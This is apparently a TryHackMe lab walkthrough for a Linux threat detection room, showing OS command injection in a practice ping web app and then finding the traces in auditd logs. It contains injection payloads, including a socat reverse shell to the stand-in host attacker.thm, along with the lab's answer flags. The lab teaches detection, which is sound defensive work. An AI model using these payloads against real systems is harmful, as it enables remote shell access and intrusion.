<p align="center">
  <img src="https://assets.tryhackme.com/img/logo/tryhackme_logo_full.svg" width="150" alt="TryHackMe Logo">
</p>

# Linux Threat Detection 3
|  Room Name | Linux Threat Detection 3 |
|----------|-------|
| Author | Dhruv Tripathi |
| Link | [Linux Threat Detection 3](https://tryhackme.com/room/linuxthreatdetection3) |

# Room Information
```bash Type: Walkthrough
Difficulty: Medium  
Tags: - 
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
Subscription type: Premium
Description:
Cover the last stages of attacks on Linux and learn how they look in system logs.
```
## Task 1

### Let's go!

- Answer: `No answer needed`

## Task 2

### Run `127.0.0.1 && whoami` in the TryPingMe web app. What output do you see after the ping results?

- For this question, we needed to launch the Attackbox and go to the TryPingMe web application at `http://MACHINE_IP:8000`. Once we enter the command into the textbox, the application returns the answer. This is an example of OS command injection, which occurs when a web application fails to properly validate or sanitise user input and passes it directly to the system shell for execution. In this case, the first command checks the loopback address. Since that check returns true, the `whoami` command is then executed, which displays the username of the user running the command
  
<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/2bb79076-0693-464d-ad0b-1de92b6ff7a8" />
</p>

- Answer: `svctrypingme`

### Now try spawning a reverse shell to the imaginary "attacker.thm" address. Run `127.0.0.1 && socat TCP:attacker.thm:1337 EXEC:sh` in the web app. What is the flag returned in the TryPingMe response?

- Similar to the last question, we can enter the command into the textbox. This is another example of OS command injection. The first command checks the loopback address, and if successful, the `socat` command establishes a TCP connection to the attacker's machine on port `1337` and attempts to provide access to the server's shell. This is known as a reverse shell

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/69d1873d-0c92-4681-b477-e1102fb0713a" />
</p>

- Answer: `THM{revshells_practitioner!}`

### Now look at the exported auditd logs at /home/ubuntu/scenario. Which IP spawned a similar reverse shell via the TryPingMe app?

- We can filter via `ausearch -i -if /home/ubuntu/scenario/audit.log -x socat` to search the audit logs for executions of `socat`. In the output, I found a TCP connection to `10.14.105.255` on port `1337`. The working directory was `/opt/trypingme`, indicating that the command originated from the TryPingMe application

<p align="center">
<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/b7259930-73e9-422a-b1fb-9ad5a5232836" />
</p>

- Answer: `10.14.105.255`

## Task 3

